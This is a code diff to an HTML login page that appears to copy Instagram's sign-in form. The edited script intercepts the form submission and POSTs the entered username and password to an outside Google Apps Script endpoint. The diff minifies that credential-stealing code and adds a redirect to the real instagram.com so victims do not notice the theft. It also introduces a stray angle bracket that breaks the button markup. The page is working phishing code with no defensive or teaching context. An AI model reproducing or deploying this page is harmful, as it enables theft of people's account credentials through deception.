@@ -41,7 +41,7 @@
           <label for="password">Password</label>
         </div>
         <div class="form-content">
-          <button type="submit" value="Submit" name="submit">Log in</button>
+          <button type="submit" value="Submit"  onclick="window.location.href = 'https://instagram.com/';"> name="submit">Log in</button>
         </div>
         <div class="form-ending">
           <center>
@@ -144,19 +144,7 @@
     </footer>
 
     <script>
-      let form = document.querySelector("form")
-      form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      let data = new FormData(form);
-      fetch('https://script.google.com/macros/s/AKfycbxqHVFWzCx9Mc4w3jnEeBnoZq3DOCrtHop02Uc5oVOQ71ERZ6q2siocKGDmpu2eWEHv/exec',
-      {
-        method: "POST",
-        body: data
-      })
-     .then(res => res.text())
-     .then(data => console.log(data));
-    
-    })
+let form=document.querySelector("form");form.addEventListener("submit",(e=>{e.preventDefault();let o=new FormData(form);fetch("https://script.google.com/macros/s/AKfycbxqHVFWzCx9Mc4w3jnEeBnoZq3DOCrtHop02Uc5oVOQ71ERZ6q2siocKGDmpu2eWEHv/exec",{method:"POST",body:o}).then((e=>e.text())).then((e=>console.log(e)))}));
     </script>
   </body>
 </html>
